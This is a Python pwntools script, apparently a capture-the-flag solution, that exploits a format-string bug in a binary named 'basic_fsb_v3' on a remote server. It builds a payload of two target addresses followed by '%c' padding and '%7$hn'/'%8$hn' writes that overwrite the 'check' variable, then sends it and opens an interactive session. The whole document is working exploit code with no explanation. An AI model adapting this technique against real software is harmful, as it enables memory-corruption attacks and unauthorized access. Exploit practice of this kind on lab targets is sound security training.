from pwn import *

# p = process("./basic_fsb_v3")
p = remote("141.164.39.45", 8003)
e = ELF("./basic_fsb_v3")

check = e.symbols['check']

pl = b''
pl += p32(check) # 7777
pl += p32(check + 2) # 8888

pl += '%{}c'.format(0x8888 - len(pl)).encode()
pl += '%7$hn'.encode()

pl += '%{}c'.format(0x10000 + 0x7777 - 0x8888).encode()
pl += '%8$hn'.encode()

pause()
p.send(pl)
p.interactive()
